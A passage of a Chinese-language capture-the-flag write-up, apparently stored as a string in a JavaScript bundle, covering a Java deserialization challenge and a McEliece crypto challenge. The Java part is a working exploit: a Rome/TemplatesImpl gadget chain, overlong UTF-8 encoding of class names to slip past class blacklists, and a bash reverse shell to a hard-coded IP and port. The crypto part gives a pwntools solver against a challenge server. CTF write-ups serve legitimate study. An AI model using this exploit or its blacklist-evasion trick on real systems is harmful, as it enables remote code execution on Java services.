map.put('j', new int[]{0xc1, 0xaa});
map.put('k', new int[]{0xc1, 0xab});
map.put('l', new int[]{0xc1, 0xac});
map.put('m', new int[]{0xc1, 0xad});
map.put('n', new int[]{0xc1, 0xae});
map.put('o', new int[]{0xc1, 0xaf});
map.put('p', new int[]{0xc1, 0xb0});
map.put('q', new int[]{0xc1, 0xb1});
map.put('r', new int[]{0xc1, 0xb2});
map.put('s', new int[]{0xc1, 0xb3});
map.put('t', new int[]{0xc1, 0xb4});
map.put('u', new int[]{0xc1, 0xb5});
map.put('v', new int[]{0xc1, 0xb6});
map.put('w', new int[]{0xc1, 0xb7});
map.put('x', new int[]{0xc1, 0xb8});
map.put('y', new int[]{0xc1, 0xb9});
map.put('z', new int[]{0xc1, 0xba});
map.put('A', new int[]{0xc1, 0x81});
map.put('B', new int[]{0xc1, 0x82});
map.put('C', new int[]{0xc1, 0x83});
map.put('D', new int[]{0xc1, 0x84});
map.put('E', new int[]{0xc1, 0x85});
map.put('F', new int[]{0xc1, 0x86});
map.put('G', new int[]{0xc1, 0x87});
map.put('H', new int[]{0xc1, 0x88});
map.put('I', new int[]{0xc1, 0x89});
map.put('J', new int[]{0xc1, 0x8a});
map.put('K', new int[]{0xc1, 0x8b});
map.put('L', new int[]{0xc1, 0x8c});
map.put('M', new int[]{0xc1, 0x8d});
map.put('N', new int[]{0xc1, 0x8e});
map.put('O', new int[]{0xc1, 0x8f});
map.put('P', new int[]{0xc1, 0x90});
map.put('Q', new int[]{0xc1, 0x91});
map.put('R', new int[]{0xc1, 0x92});
map.put('S', new int[]{0xc1, 0x93});
map.put('T', new int[]{0xc1, 0x94});
map.put('U', new int[]{0xc1, 0x95});
map.put('V', new int[]{0xc1, 0x96});
map.put('W', new int[]{0xc1, 0x97});
map.put('X', new int[]{0xc1, 0x98});
map.put('Y', new int[]{0xc1, 0x99});
map.put('Z', new int[]{0xc1, 0x9a});

bytesMap.put('$', new int[]{0xe0,0x80,0xa4});
bytesMap.put('.', new int[]{0xe0,0x80,0xae});
bytesMap.put(';', new int[]{0xe0,0x80,0xbb});
bytesMap.put('A', new int[]{0xe0,0x81,0x81});
bytesMap.put('B', new int[]{0xe0,0x81,0x82});
bytesMap.put('C', new int[]{0xe0,0x81,0x83});
bytesMap.put('D', new int[]{0xe0,0x81,0x84});
bytesMap.put('E', new int[]{0xe0,0x81,0x85});
bytesMap.put('F', new int[]{0xe0,0x81,0x86});
bytesMap.put('G', new int[]{0xe0,0x81,0x87});
bytesMap.put('H', new int[]{0xe0,0x81,0x88});
bytesMap.put('I', new int[]{0xe0,0x81,0x89});
bytesMap.put('J', new int[]{0xe0,0x81,0x8a});
bytesMap.put('K', new int[]{0xe0,0x81,0x8b});
bytesMap.put('L', new int[]{0xe0,0x81,0x8c});
bytesMap.put('M', new int[]{0xe0,0x81,0x8d});
bytesMap.put('N', new int[]{0xe0,0x81,0x8e});
bytesMap.put('O', new int[]{0xe0,0x81,0x8f});
bytesMap.put('P', new int[]{0xe0,0x81,0x90});
bytesMap.put('Q', new int[]{0xe0,0x81,0x91});
bytesMap.put('R', new int[]{0xe0,0x81,0x92});
bytesMap.put('S', new int[]{0xe0,0x81,0x93});
bytesMap.put('T', new int[]{0xe0,0x81,0x94});
bytesMap.put('U', new int[]{0xe0,0x81,0x95});
bytesMap.put('V', new int[]{0xe0,0x81,0x96});
bytesMap.put('W', new int[]{0xe0,0x81,0x97});
bytesMap.put('X', new int[]{0xe0,0x81,0x98});
bytesMap.put('Y', new int[]{0xe0,0x81,0x99});
bytesMap.put('Z', new int[]{0xe0,0x81,0x9a});
bytesMap.put('[', new int[]{0xe0,0x81,0x9b});
bytesMap.put(']', new int[]{0xe0,0x81,0x9d});
bytesMap.put('a', new int[]{0xe0,0x81,0xa1});
bytesMap.put('b', new int[]{0xe0,0x81,0xa2});
bytesMap.put('c', new int[]{0xe0,0x81,0xa3});
bytesMap.put('d', new int[]{0xe0,0x81,0xa4});
bytesMap.put('e', new int[]{0xe0,0x81,0xa5});
bytesMap.put('f', new int[]{0xe0,0x81,0xa6});
bytesMap.put('g', new int[]{0xe0,0x81,0xa7});
bytesMap.put('h', new int[]{0xe0,0x81,0xa8});
bytesMap.put('i', new int[]{0xe0,0x81,0xa9});
bytesMap.put('j', new int[]{0xe0,0x81,0xaa});
bytesMap.put('k', new int[]{0xe0,0x81,0xab});
bytesMap.put('l', new int[]{0xe0,0x81,0xac});
bytesMap.put('m', new int[]{0xe0,0x81,0xad});
bytesMap.put('n', new int[]{0xe0,0x81,0xae});
bytesMap.put('o', new int[]{0xe0,0x81,0xaf});
bytesMap.put('p', new int[]{0xe0,0x81,0xb0});
bytesMap.put('q', new int[]{0xe0,0x81,0xb1});
bytesMap.put('r', new int[]{0xe0,0x81,0xb2});
bytesMap.put('s', new int[]{0xe0,0x81,0xb3});
bytesMap.put('t', new int[]{0xe0,0x81,0xb4});
bytesMap.put('u', new int[]{0xe0,0x81,0xb5});
bytesMap.put('v', new int[]{0xe0,0x81,0xb6});
bytesMap.put('w', new int[]{0xe0,0x81,0xb7});
bytesMap.put('x', new int[]{0xe0,0x81,0xb8});
bytesMap.put('y', new int[]{0xe0,0x81,0xb9});
bytesMap.put('z', new int[]{0xe0,0x81,0xba});

    }

    public void charWritTwoBytes(String name){
        //\u5C06name\u8FDB\u884Coverlong Encoding
        byte[] bytes=new byte[name.length() * 2];
        int k=0;
        StringBuffer str=new StringBuffer();
        for (int i = 0; i < name.length(); i++) {
            int[] bs =map.get(name.charAt(i));
            bytes[k++]= (byte) bs[0];
            bytes[k++]= (byte) bs[1];
            str.append(Integer.toHexString(bs[0])+",");
            str.append(Integer.toHexString(bs[1])+",");
        }
        System.out.println(str.toString());
        try {
            writeShort(name.length() * 2);
            write(bytes);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
    public void charWriteThreeBytes(String name){
        //\u5C06name\u8FDB\u884Coverlong Encoding
        byte[] bytes=new byte[name.length() * 3];
        int k=0;
        StringBuffer str=new StringBuffer();
        for (int i = 0; i < name.length(); i++) {
            int[] bs =bytesMap.get(name.charAt(i));
            bytes[k++]= (byte) bs[0];
            bytes[k++]= (byte) bs[1];
            bytes[k++]= (byte) bs[2];
            str.append(Integer.toHexString(bs[0])+",");
            str.append(Integer.toHexString(bs[1])+",");
            str.append(Integer.toHexString(bs[2])+",");
        }
        System.out.println(str.toString());
        try {
            writeShort(name.length() * 3);
            write(bytes);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    protected void writeClassDescriptor(ObjectStreamClass desc)
            throws IOException {
        String name = desc.getName();
        boolean externalizable = (boolean)getFieldValue(desc, "externalizable");
        boolean serializable = (boolean)getFieldValue(desc, "serializable");
        boolean hasWriteObjectData = (boolean)getFieldValue(desc, "hasWriteObjectData");
        boolean isEnum = (boolean)getFieldValue(desc, "isEnum");
        ObjectStreamField[] fields = (ObjectStreamField[])getFieldValue(desc, "fields");
        System.out.println(name);
        //\u5199\u5165name\uFF08jdk\u539F\u751F\u5199\u5165\u65B9\u6CD5\uFF09
//        writeUTF(name);
        //\u5199\u5165name(\u4E24\u4E2A\u5B57\u8282\u8868\u793A\u4E00\u4E2A\u5B57\u7B26)
//        charWritTwoBytes(name);
        //\u5199\u5165name(\u4E09\u4E2A\u5B57\u8282\u8868\u793A\u4E00\u4E2A\u5B57\u7B26)
        charWriteThreeBytes(name);

        writeLong(desc.getSerialVersionUID());
        byte flags = 0;
        if (externalizable) {
            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
            Field protocolField =
                    null;
            int protocol;
            try {
                protocolField = ObjectOutputStream.class.getDeclaredField("protocol");
                protocolField.setAccessible(true);
                protocol = (int) protocolField.get(this);
            } catch (NoSuchFieldException e) {
                throw new RuntimeException(e);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
            if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
                flags |= ObjectStreamConstants.SC_BLOCK_DATA;
            }
        } else if (serializable) {
            flags |= ObjectStreamConstants.SC_SERIALIZABLE;
        }
        if (hasWriteObjectData) {
            flags |= ObjectStreamConstants.SC_WRITE_METHOD;
        }
        if (isEnum) {
            flags |= ObjectStreamConstants.SC_ENUM;
        }
        writeByte(flags);

        writeShort(fields.length);
        for (int i = 0; i < fields.length; i++) {
            ObjectStreamField f = fields[i];
            writeByte(f.getTypeCode());
            writeUTF(f.getName());
            if (!f.isPrimitive()) {
invoke(this, "writeTypeString", f.getTypeString());
            }
        }
    }

    public static void invoke(Object object, String methodName, Object... args) {
        Method writeTypeString = null;
        try {
            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);
            writeTypeString.setAccessible(true);
            try {
                writeTypeString.invoke(object, args);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            } catch (InvocationTargetException e) {
                throw new RuntimeException(e);
            }
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getFieldValue(Object object, String fieldName) {
        Class<?> clazz = object.getClass();
        Field field = null;
        Object value = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            value = field.get(object);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        return value;
    }
}

/*    */
/*    */  class MyObjectInputStream
        /*    */   extends ObjectInputStream {
    /* 12 */   private static ArrayList<String>blackList= new ArrayList<>();
    /*    */   static {
        /* 14 */blackList.add("javax.management.BadAttributeValueExpException");
        /* 15 */blackList.add("com.sun.syndication.feed.impl.ToStringBean");
        /* 16 */blackList.add("java.security.SignedObject");
        /* 17 */blackList.add("com.sun.rowset.JdbcRowSetImpl");
        /*    */   }
    /*    */   public MyObjectInputStream(InputStream inputStream) throws Exception {
        /* 20 */     super(inputStream);
        /*    */   }
    /*    */
    /*    */   protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException {
        /* 24 */     ObjectStreamClass readDesc = super.readClassDescriptor();
        /*    */
        /* 26 */     for (int i = 0; i < 4; i++) {
            /* 27 */       if (readDesc.getName().contains(blackList.get(i)))
                /* 28 */         throw new InvalidClassException("bad hacker!");
            /*    */     }
        /* 30 */     return readDesc;
        /*    */   }
    /*    */ }

class ByteCompare
        /*    */ {
    /*  7 */   private static final ArrayList<byte[]>blacklist= (ArrayList) new ArrayList<>();
    /*  8 */ String[] s = new String[]{"java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArrayLlist"};

    /*    */
    public ByteCompare() {
        /* 10 */
blacklist.add(this.s[0].getBytes());
        /* 11 */
blacklist.add(this.s[1].getBytes());
        /* 12 */
blacklist.add(this.s[2].getBytes());
        /*    */
    }

    /*    */
    public void Compared(byte[] OriginData) {
        /* 15 */
        for (int k = 0; k < 3; k++) {
            /* 16 */
            for (int i = 0; i < OriginData.length - ((byte[])blacklist.get(k)).length + 1; i++) {
                /* 17 */
                boolean found = true;
                /* 18 */
                for (int j = 0; j < ((byte[])blacklist.get(k)).length; j++) {
                    /* 19 */
                    if (OriginData[i + j] != ((byte[])blacklist.get(k))[j]) {
                        /* 20 */
                        found = false;
                        /*    */
                        break;
                        /*    */
                    }
                    /*    */
                }
                /* 24 */
                if (found)
                    /* 25 */ throw new NullPointerException("Don't hacker!");
                /*    */
            }
            /*    */
        }
        /*    */
    }
}

public class POC1 {
    public static void main(String[] args) throws Exception{
        Object templates = Gadgets.createTemplatesImpl("bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/62.234.210.59/6778<&1");

        EqualsBean bean = new EqualsBean(String.class,"r");

        Map hashMap = new HashMap();
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",bean);
        map1.put("zZ",templates);
        map2.put("zZ",bean);
        map2.put("yy",templates);
        hashMap.put(map1, "");
        hashMap.put(map2, "");

setFieldValue(bean,"_beanClass",Templates.class);
setFieldValue(bean,"_obj",templates);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new CustomObjectOutputStream(baos);
//        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        MyObjectInputStream ois = new MyObjectInputStream(bais);
        ByteCompare byteCompare = new ByteCompare();
        byteCompare.Compared(baos.toByteArray());
        ois.readObject();
        ois.close();
    }

    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
}

\`\`\`

\u5728\u81EA\u5DF1\u670D\u52A1\u5668\u4E0A\u76D1\u542C\u7AEF\u53E3\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=N2RjOTVkNDM5OGNiODY0YmUxZWQ1MTRkZDUzMGM4ZThfOEV0Vkhkck1ERENkdGdoTHZKYjNUTTQ5Nks0YllaRU5fVG9rZW46SERiaGJpeFI0b3BCUVF4d0piRmN5VjFqbllmXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=N2RjOTVkNDM5OGNiODY0YmUxZWQ1MTRkZDUzMGM4ZThfOEV0Vkhkck1ERENkdGdoTHZKYjNUTTQ5Nks0YllaRU5fVG9rZW46SERiaGJpeFI0b3BCUVF4d0piRmN5VjFqbllmXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

## crypto

### BabyOracle1

- \u7EBF\u6027\u7F16\u7801\u53C2\u8003\uFF1A [Linear Code and Decoding Problem](https://tanglee.top/2023/11/28/Code-based-Cryptography-Linear-Code-Basis/)
- ISD \u7B97\u6CD5\u53C2\u8003\uFF1A [Introduction to Information Set Decoding](https://tanglee.top/2024/01/05/ISD-Introduction/)

\u751F\u6210\u4E86\u4E00\u4E2A\u57FA\u4E8E Goppa Code \u7684 McEliece \u52A0\u5BC6\u7B97\u6CD5\u3002\u7ED9\u4E86 seed\uFF0C\u6240\u4EE5\u6211\u4EEC\u53EF\u4EE5\u76F4\u63A5\u8BA1\u7B97\u51FA\u79C1\u94A5 G\uFF0CP,  S \u548C \u516C\u94A5 Gp = S*G*P \u3002\u6309\u7167\u9898\u76EE\u7ED9\u7684\u7F16\u7801\u53C2\u6570 (n,k) = (1024,524)\uFF0C\u5373\u4F7F\u7528\u79C1\u94A5\u53BB\u505A Goppa Code \u7684\u89E3\u7801\uFF0CPatterson \u89E3\u7801\u7B97\u6CD5\u80FD\u591F\u7EA0\u9519\u7684\u6700\u5927\u6BD4\u7279\u6570\u4E5F\u53EA\u6709 51 \u5DE6\u53F3\uFF0C\u800C\u9898\u76EE\u7684 t = 160 \uFF0C\u5373\u9519\u8BEF\u5411\u91CF\u7684\u5E73\u5747\u6C49\u660E\u91CD\u91CF\u4E3A 80 \uFF0C\u76F4\u63A5 decode \u4E0D\u592A\u73B0\u5B9E\u3002

\u6CE8\u610F\u5230\u6211\u4EEC\u8981 decode \u7684\u5BC6\u94A5 key \u53EA\u6709 16 \u5B57\u8282\uFF0C \u5373 128 \u6BD4\u7279\uFF0C\u800C\u586B\u5145\u662F\u5DF2\u77E5\u7684\uFF0C\u9AD8\u4F4D\u5168\u90E8\u8865 0\uFF0C\u8FD9\u6837\u6211\u4EEC\u5C31\u76F8\u5F53\u4E8E\u964D\u7EF4\u4E86\uFF0C\u5373\u5B9E\u9645\u9700\u8981\u89E3\u7801\u7684\u7EBF\u6027\u7F16\u7801\u53C2\u6570\u4E3A (n,k) = (1024, 128) ,  \u8BEF\u5DEE\u6C49\u660E\u91CD\u91CF\u53D6\u4E3A 80\uFF0C\u8FD9\u4E2A\u53C2\u6570\u653E\u8FDB\u4E00\u822C\u7684\u7EBF\u6027\u7F16\u7801\u7684 ISD decoder\uFF0C\u5176\u65F6\u95F4\u590D\u6742\u5EA6\u4E5F\u5927\u6982\u5728 2^32 \u5DE6\u53F3\uFF0C\u591A\u8DD1\u51E0\u6B21\uFF0C\u78B0\u5230 error \u7A0D\u5FAE\u5C11\u4E00\u70B9\u7684\u60C5\u51B5\uFF0C\u57FA\u672C\u5F88\u5FEB\u5C31\u80FD\u8DD1\u51FA\u6765\u3002\uFF08\u611F\u89C9~~\u50CF\u662F\u975E\u9884\u671F\uFF0C\u770B\u4E86 flag \u786E\u5B9E\u662F\u975E\u9884\u671F\uFF0Ckey reuse~~\uFF09

EXP \u5982\u4E0B

\`\`\`
from pwn import remote, process, log, context
from sage.all import GF, PolynomialRing, Permutations, codes, random_matrix, vector, set_random_seed, ZZ
from ast import literal_eval
from Crypto.Cipher import AES
# nc 146.56.245.60 1337
io = remote('146.56.245.60', '1337')

def get_keys(seed):
    F = GF(2**10)
    R = PolynomialRing(F, 'x')
    x = R.gen()
    g = x**50 + x**3 + 1
    L = [a for a in F.list() if g(a) != 0]
    set_random_seed(seed)
    G = codes.GoppaCode(g, L).generator_matrix()
    P = Permutations(1024).random_element().to_matrix()
    S = random_matrix(GF(2), 524, 524)
    return G, P, S, S*G*P

def query_AES(io:remote, mode:bytes = b"n", msg:bytes = None):
    io.sendlineafter("> ".encode(), b"A")
    io.sendlineafter(b"encrypt msg? y/n ", mode)
    if mode == b"y":
        io.sendlineafter(b"msg:", msg.hex().encode())
    return bytes.fromhex(io.recvline().decode().strip())

def query_Encode(io:remote, mode:bytes = b"n", msg:bytes = None):
    io.sendlineafter("> ".encode(), b"E")
    io.sendlineafter(b"encrypt msg? y/n ", mode)
    if mode == b"y":
        io.sendlineafter(b"msg:", msg.hex().encode())
    return literal_eval(io.recvline().decode().strip())

# context.log_level = 'debug'
io.recvuntil("\u{1F331}".encode("utf8"))
seed = int(io.recvline().decode().strip())
G, P, S, Gp = get_keys(seed)

err_num = 80
n = 1024
k = n - 10 * 50
print(f"[+] {n = }, {k = }, {err_num = }")

# m * S*G*P + e
effective_Gp = Gp[-128:]
C = codes.LinearCode(effective_Gp)
D = codes.decoders.LinearCodeInformationSetDecoder(C, err_num)
print("[+] Decoding time estimate : ", D.algorithm().time_estimate())

aes_enc_flag = query_AES(io)
encoded_key = query_Encode(io)
# print("[+] Encoded key : ", encoded_key)
encoded_key_vector = vector(GF(2), encoded_key)
msg = D.decode_to_message(encoded_key_vector)
msg_num = ZZ(list(msg)[::-1], base=2)
# msg_num = ZZ(list(msg), base=2)
key = bytes.fromhex(hex(msg_num)[2:])
flag = AES.new(key, AES.MODE_ECB).decrypt(aes_enc_flag)
print(flag)

\`\`\``;export{n as _};
